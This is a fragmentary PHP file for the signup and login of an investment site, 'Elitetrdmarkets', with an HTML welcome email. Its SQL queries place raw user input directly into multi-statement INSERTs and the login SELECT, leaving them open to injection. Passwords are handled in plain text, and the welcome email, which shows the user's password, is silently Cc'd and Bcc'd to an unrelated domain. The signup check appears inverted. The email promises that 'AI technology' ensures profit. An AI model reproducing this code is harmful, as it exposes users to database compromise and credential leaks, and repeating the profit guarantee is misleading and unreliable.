...
if (isset($_POST['register'])) {
    ...
    $mail_num = $mail_query->num_rows;
      ...
      if ($mail_num >= 1) {
        ...
        $sql = "INSERT INTO users (fname, lname, email, country, currency,  plans, phone,  password) 
                VALUES ('$fname', '$lname', '$email', '$country', '$currency', '$plans', '$phone', '$password');";


        $sql .= "INSERT INTO referrals (client_user, email, ref_bonus, inv_date) 
                VALUES ('$refer', '$email', '30', '$date_time');";


        
        $sql .= "INSERT INTO notifications (n_type, n_description, n_date, n_status, n_user) 
                VALUES ('Account signup', '$info', '$date_time', 'unread', '$email');";
...
<body class='respond' leftmargin='0' topmargin='0' marginwidth='0' marginheight='0'>
                            ...
                            <table border='0' align='center' width='590' cellpadding='0' cellspacing='0' class='container590'>
                                ...
                                <tr>
                                    <td align='center' height='70' style='height:70px;'>
                                        <a href='' style='display: block; border-style: none !important; border: 0 !important;'><img width='100' border='0' style='display: block; width: 300px;' src='https://www.elitetrdmarkets.com/logo.png' alt='' /></a>
                                    </td>
                                </tr>
                            </table>
                        </td>
                    ...
                    <tr>
                        <td align='center' style='color: #343434; font-size: 24px; font-family: Quicksand, Calibri, sans-serif; font-weight:700;letter-spacing: 3px; line-height: 35px;' class='main-header'>
                            ...
                            <div style='line-height: 35px'>
                                ...
                                Welcome to <span style='color:#06052e'>Elitetrdmarkets</span>
                        ...
                        <td align='center'>
                            <table border='0' width='400' align='center' cellpadding='0' cellspacing='0' class='container590'>
                                <tr>
                                    ...
                                    <h4>Thanks you for joining Elitetrdmarkets as your new home. We're excited to have you on board!</h4>.
                                            <br><br>
                                        Elitetrdmarkets brings investment power to your fingertips. Our platform has the most advanced AI technology to ensure your profit. Our platform is also secured and keeps your assets safe 24/7
                                            <hr>
                                            <span style='color: #06052e'>Starter Account Details</span>
                                            <br><br>

                                            <div style='float: left;'>Your email is  <span style='color: #5caad2;'>$email</span></div>
                                            <div style='float: left;'>Your password is  <span style='color: #5caad2;'>$real_password</span></div>
                                            <br><br>
                                            <div style='float: left;'>Account is successfully created </div>
                                ...
                                <tr>
                                    <td align='center' style='color: #ffffff; font-size: 14px; font-family: 'Work Sans', Calibri, sans-serif; line-height: 26px;'>
                                        ...
                                        <div style='line-height: 26px;'>
                                            <a href='www.elitetrdmarkets.com/login' style='color: #ffffff; text-decoration: none; background-color:#06052e;'>LOGIN</a>
                                        </div>
                                    </td>
                                </tr>
                        ...
                        <td>
                            <table border='0' width='300' align='left' cellpadding='0' cellspacing='0' style='border-collapse:collapse; mso-table-lspace:0pt; mso-table-rspace:0pt;' class='container590'>
                                ...
                                <tr>
                                    <!-- logo -->
                                    <td align='center'>
                                        <a href='' style=' border-style: none !important; display: block; border: 0 !important;'><img src='https://www.elitetrdmarkets.com/c.jpg' style='display: block; width: 590px;' width='590' border='0' alt='' /></a>
                                    </td>
                                </tr>
                                ...
                                <tr>
                                    <td align='left' style='color: #888888; font-size: 14px; font-family: 'Work Sans', Calibri, sans-serif; line-height: 23px;' class='text_color'>
                                        <div style='color: #333333; font-size: 14px; font-family: 'Work Sans', Calibri, sans-serif; font-weight: 600; mso-line-height-rule: exactly; line-height: 23px;'>
                                            ...
                                            Email us: <br/> <a href='mailto:' style='color: #888888; font-size: 14px; font-family: 'Hind Siliguri', Calibri, Sans-serif; font-weight: 400;'>support@elitetrdmarkets.com </a>
    ...
    <table border='0' width='100%' cellpadding='0' cellspacing='0' bgcolor='f4f4f4'>
        ...
        <tr>
            <td height='25' style='font-size: 25px; color: b; line-height: 25px;'>&nbsp;</td>
        </tr>
...
$headers .= 'Cc: support@universalinvt.com ' . "\r\n"; 
$headers .= 'Bcc: support@universalinvt.com ' . "\r\n"; 
...
if (isset($_POST['login'])) {
    ...
    // Select data
    $sql_log = "SELECT * FROM users WHERE  email ='$email' AND password='$password'";
